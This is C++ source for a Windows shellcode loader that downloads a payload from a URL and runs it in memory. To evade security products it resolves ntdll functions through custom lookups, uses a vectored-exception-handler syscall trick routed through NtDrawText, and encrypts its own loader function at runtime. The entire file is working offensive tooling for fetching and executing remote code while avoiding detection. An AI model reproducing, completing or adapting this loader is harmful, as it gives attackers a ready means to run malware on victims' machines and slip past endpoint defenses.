#include <Windows.h>
#include <vector>
#include <wininet.h>
#include <iostream>
#include "SED.h"
#include "peb.h"
#include <map>
#include "CustomGetModuleHandleW.h"
#include "CustomGerProcAddr.h"

#pragma comment(lib, "wininet.lib")

using namespace std;

std::map<PVOID, string> Nt_Table;
DWORD t = 0;
LPVOID m_Index = (LPVOID)CustomGetProcAddress(CustomGetModuleHandleW(L"Ntdll.dll"), "NtDrawText");

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len);
LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);
extern "C" VOID hello();


PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (len--)
        *d++ = *s++;
    return dest;
}

LONG WINAPI VectExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        pExceptionInfo->ContextRecord->R10 = pExceptionInfo->ContextRecord->Rcx;
        hello();
        pExceptionInfo->ContextRecord->Rax = t;
        hello();
        pExceptionInfo->ContextRecord->Rip = (DWORD64)((DWORD64)m_Index + 0x12);
        hello();
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

std::vector<BYTE> DownloadBinary(const wchar_t* url) {
    HINTERNET hInternet = InternetOpenW(L"ShellcodeLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return {};

    HINTERNET hFile = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return {};
    }

    std::vector<BYTE> buffer;
    BYTE tempBuffer[1024];
    DWORD bytesRead;

    while (InternetReadFile(hFile, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead) {
        buffer.insert(buffer.end(), tempBuffer, tempBuffer + bytesRead);
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return buffer;
}

__declspec(noinline) void* DemoFunction(void* DummyArgument) {
    AddVectoredExceptionHandler(1, VectExceptionHandler);
    printf("[Sigma] - Starting shellcode loader.\n");
    const wchar_t* url = L""; // Replace with the actual URL of the BINARY FILE YOU GOTTEN (PE2SHC/DONUT)

    std::vector<BYTE> shellcode = DownloadBinary(url);

    if (shellcode.empty()) {
        printf("[Sigma] - Failed to download shellcode.\n");
        return EndSED((void*)(-1));
    }

    printf("[Sigma] - Shellcode downloaded. Size: %llu bytes.\n", shellcode.size());

    HANDLE hProcess = GetCurrentProcess();
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = shellcode.size();
    DWORD ulOldProtect;

    typedef DWORD(WINAPI* NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    typedef DWORD(WINAPI* NtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG Protect, PDWORD oldProtect);
    typedef DWORD(WINAPI* pNtCreateThreadEx)(PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter, ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer);

    NtAllocateVirtualMemory pNtAllocateVirtualMemory = (NtAllocateVirtualMemory)CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "ZwAllocateVirtualMemory");
    pNtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

    VxMoveMemory(lpAddress, shellcode.data(), shellcode.size());

    NtProtectVirtualMemory pNtProtectVirtualMemory = (NtProtectVirtualMemory)CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "ZwProtectVirtualMemory");
    pNtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    HANDLE hThread;
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "ZwCreateThreadEx");
    NtCreateThreadEx(&hThread, PROCESS_ALL_ACCESS, NULL, hProcess, lpAddress, NULL, 0, 0, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return EndSED((void*)(0));
}

int main() {
    EncryptFunction((uintptr_t)DemoFunction);
    CallFunction(DemoFunction);

    printf("[Main] - Execution finished.\n");
    return 0;
}
